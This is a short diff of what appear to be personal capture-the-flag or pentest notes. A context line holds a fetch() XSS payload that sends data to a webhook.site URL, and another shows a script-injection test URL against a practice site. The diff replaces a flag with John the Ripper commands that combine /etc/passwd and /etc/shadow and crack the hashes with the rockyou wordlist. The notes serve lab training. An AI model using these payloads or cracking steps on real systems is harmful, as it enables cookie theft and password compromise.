@@ -94,5 +94,10 @@ fetch('https://webhook.site/b6cd2f7a-deb7-40bb-9689-48a7a69f6d1d'+'?c='+encodeUR
 
 https://vulnlib.vulnapp.id/search?q=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E
 
-FLAG{SQL1_L0g1n_Byp4ss3d}
+John the ripper
+
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show hashes.txt
+
 
